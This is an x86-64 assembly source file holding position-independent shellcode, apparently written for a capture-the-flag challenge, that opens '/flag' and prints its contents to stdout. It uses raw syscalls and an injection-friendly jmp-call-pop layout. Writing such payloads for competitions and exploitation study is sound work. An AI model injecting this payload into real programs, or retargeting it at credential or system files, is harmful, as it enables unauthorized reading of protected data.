bits 64
section .text
global _start

%define PATH "/flag"

_start:
	jmp pre_filename

post_filename:
	xor rcx, rcx
	add rcx, 2
	; int open(const char *pathname, int flags, mode_t mode);
	pop rdi
	xor rsi, rsi	; O_RDONLY
	mov rax, rcx	; open
	syscall

	mov r10, rax

read:
	sub rsp, 8
	; ssize_t read(int fd, void *buf, size_t count);
	mov rdi, r10 	; fd
	mov rsi, rsp	; buf
	push 1
	pop rdx 	; count
	xor rax, rax 	; read
	syscall

	xor rcx, rcx
	cmp rax, rcx
	jle exit

	; ssize_t write(int fd, const void *buf, size_t count);
	inc rcx ; store 1
	mov rdi, rcx ; fd = 1
	mov rsi, rsp ; buf
	mov rdx, rcx ; count
	mov rax, rcx
	syscall

	add rsp, 8
	jmp read

exit:
	add rsp, 8

	; void exit(int status);
	xor rdi, rdi
	push 60 ; exit
	pop rax
	syscall

pre_filename:
	call post_filename
	db PATH, 0
